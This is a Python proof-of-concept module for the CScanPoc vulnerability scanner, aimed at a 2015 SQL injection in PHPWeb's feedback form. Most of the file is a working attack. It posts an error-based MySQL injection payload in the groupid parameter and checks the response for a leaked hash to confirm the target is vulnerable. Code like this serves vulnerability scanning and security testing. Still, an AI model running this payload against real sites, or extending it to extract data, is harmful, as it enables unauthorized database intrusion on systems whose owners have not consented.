# coding: utf-8

from CScanPoc.thirdparty import requests,hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
hh = hackhttp.hackhttp()

class Vuln(ABVuln):
    vuln_id = 'PHPWeb_0000' # 平台漏洞编号，留空
    name = 'PHPWeb SQL注入' # 漏洞名称
    level = VulnLevel.HIGH # 漏洞危害级别
    type = VulnType.INJECTION # 漏洞类型
    disclosure_date = '2015-08-08'  # 漏洞公布时间
    desc = '''
        PHPWeb SQL注入漏洞。
    ''' # 漏洞描述
    ref = 'Unkonwn' # 漏洞来源https://wooyun.shuimugan.com/bug/view?bug_no=0121935
    cnvd_id = 'Unkonwn' # cnvd漏洞编号
    cve_id = 'Unkonwn' #cve编号
    product = 'PHPWeb'  # 漏洞应用名称
    product_version = 'Unkonwn'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '09893c84-833a-4150-a13a-9637220520dd'
    author = '国光'  # POC编写者
    create_date = '2018-05-15' # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            arg = '{target}'.format(target=self.target)
            url = arg
            url = url + '/feedback/post.php'
            post_data = "act=formsend&company=e&content=&groupid=11' AND (SELECT 3264 FROM(SELECT COUNT(*),CONCAT(0x7164647a71,(MID((IFNULL(CAST(md5(3.14) AS CHAR),0x20)),1,50)),0x7177767771,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND 'cmij'='cmij&ImgCode=e&name=e&qq=e&tel=e&title=e"
            code, head, body, _, _ = hh.http('-d "%s" %s' % (post_data,url))
            if code == 200:
                if body and body.find('4beed3b9c4a886067de0e3a094246f78') != -1:
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(target=self.target,name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()